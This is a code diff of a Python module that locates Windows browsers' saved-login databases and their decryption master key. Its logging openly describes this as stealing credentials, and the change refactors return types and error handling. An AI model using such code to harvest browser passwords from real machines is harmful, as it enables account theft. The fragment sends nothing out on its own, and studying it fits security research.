@@ -22,7 +22,7 @@ from ctypes import (
 )
 from ctypes.wintypes import BOOL, DWORD, HANDLE, HWND, LPCWSTR, LPVOID, LPWSTR
 from pathlib import PurePath
-from typing import Sequence
+from typing import Optional, Sequence, Set, Tuple
 
 logger = logging.getLogger(__name__)
 
@@ -115,12 +115,14 @@ class WindowsCredentialsDatabaseSelector:
     def __call__(self) -> Sequence[PurePath]:
         return self._get_database_dirs()
 
-    def _get_database_dirs(self):
+    # TODO: use pathlib.Path objects everywhere, not str
+    def _get_database_dirs(self) -> Tuple[Set[str], Optional[bytes]]:
         """
         Get browsers' credentials' database directories for current user
         """
 
-        databases = set()
+        databases: Set[str] = set()
+
         for browser_name, browser_installation_path in self._browsers.items():
             logger.info(f'Attempting to steal credentials from browser "{browser_name}"')
 
@@ -144,7 +146,7 @@ class WindowsCredentialsDatabaseSelector:
                         logger.error(
                             f'Couldn\'t deserialize JSON file at "{local_state_file_path}": {err}'
                         )
-                        return []
+                        local_state_object = {}
 
                     try:
                         # add user profiles from "Local State" file
@@ -182,13 +184,6 @@ class WindowsCredentialsDatabaseSelector:
 
                     for db in db_files:
                         if db.lower() == "login data":
-                            # TODO: fix return type hints where necessary, probably can't
-                            #       generalize linux/windows anymore
-                            # TODO: return pathlib.Path object, not str
-                            # TODO: `master_key` is the same for all databases,
-                            #       can just return it once
-                            databases.add(
-                                (os.path.join(browser_installation_path, profile, db), master_key)
-                            )
+                            databases.add(os.path.join(browser_installation_path, profile, db))
 
-        return databases
+        return databases, master_key
